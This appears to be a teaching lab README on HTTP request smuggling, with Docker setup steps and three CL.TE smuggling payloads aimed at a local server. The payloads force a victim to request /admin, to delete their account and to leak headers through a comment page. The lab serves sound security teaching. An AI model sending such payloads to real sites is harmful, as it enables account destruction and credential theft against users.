# Introduction

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

## Learning outcomes

After completing this lab students should be able to:
- Understand HTTP messages
- Explain HTTP headers
- Describe how request smuggling work
- Detect HTTP request smuggling
- Execute HTTP request smuggling
- Explain how HTTP request smuggling can be prevented

Lab consists of 4 moments:
- [Tutorial](tutorial): Introduction to HTTP requests.
- [Task 1](task1): Basics of how HTTP request smuggling uses headers.
- [Task 2](task2): Introduction to how HTTP request smuggling can be used maliciously.
- [Task 3](task3): Theory about the different types of HTTP request smuggling and one attack to leak passwords.

## How to setup the lab
Make sure you have docker installed.
```bash
# Start the frontend and backend servers by running this in ~/lab
docker compose -f docker-compose.yml up -d

# Frontend server will be running at http://localhost:8080/
# Backend server will be running at http://localhost:3000/

# Close the servers by running
docker compose -f docker-compose.yml down -v
```

## Troubleshooting
Make sure you have docker setup correctly. (I, Fabian, got this working with a rootless docker through the terminal. Others setups may vary.)
# Task list


## Task 1 - redirect to /admin

The idea is to use HTTP request smuggling to redirect a victim to another page, making the user perform an action without their consent.

```sh
POST / HTTP/1.1
Host: localhost:8080
Content-Length: 10
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
x-foo: x
```


## Task 2 - redirect to /DeleteAccount

The goal is to make the user unknowingly delete their account by redirecting them to the /DeleteAccount page.

```sh
POST / HTTP/1.1
Host: localhost:8080
Content-Length: 10
Transfer-Encoding: chunked

0

POST /deleteAccount HTTP/1.1
x-foo: x
```


## Task 3 - redirect to /postComment to leak headers

The objective is to leak sensitive headers by redirecting the user to the /postComment page. Having a page that makes persistent and public (aka "reflected" to a page) a POST parameter is indicative of http smuggling header leakage vulnerabilities.

```sh
POST / HTTP/1.1
Host: localhost:8080
Content-Length: 10
Transfer-Encoding: chunked

0

POST /postComment HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 90

x=
```